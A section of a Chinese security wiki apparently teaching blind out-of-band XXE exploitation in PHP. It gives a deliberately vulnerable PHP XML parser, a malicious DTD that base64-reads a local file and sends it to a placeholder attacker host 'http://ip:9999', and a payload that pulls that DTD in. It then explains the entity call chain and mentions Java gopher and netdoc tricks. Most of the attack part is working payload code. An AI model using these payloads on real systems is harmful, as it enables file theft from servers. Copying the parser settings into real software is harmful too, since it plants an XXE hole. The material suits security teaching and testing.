### Blind XXE 利用

示例无回显读取本地敏感文件（Blind OOB XXE）：

此部分演示借用php中XXE进行说明

xml.php

```php
<?php

libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?>

```

test.dtd

```bash
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://ip:9999?p=%file;'>">

```

payload:

```bash
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">
%remote;%int;%send;
]>

```

![2.png](images/security_wiki/2a1a831dcf134f44b8a1cc3c90fd0761.png)

结果如下：

![3.png](images/security_wiki/b7f88c0930d646ef9502922f6e118f40.png)

**整个调用过程：**

我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 `%`)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。

**新的利用**

如图所示

![4.png](images/security_wiki/0c202285a0f8423cba1a9e09c5c49edf.png)

**注意：**

1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35 2.libxml 是 PHP 的 xml 支持

**netdoc协议**

| Java中在过滤了file | ftp | gopher | 情况下使用netdoc 协议列目录： |

| --- | --- | --- | --- |

|  |  |  |  |

附上一张图

![5.png](images/security_wiki/81c9e141484a4b03b10d48a1dc060c6d.png)

另外对于带外XXE还可以通过burp 进行测试如（附上两张图）：

![6.png](images/security_wiki/06d67ae98d9a493e845de3eb88b2f188.png)
![7.png](images/security_wiki/28f2eef07b004ae88c451d8c7abc42a8.png)

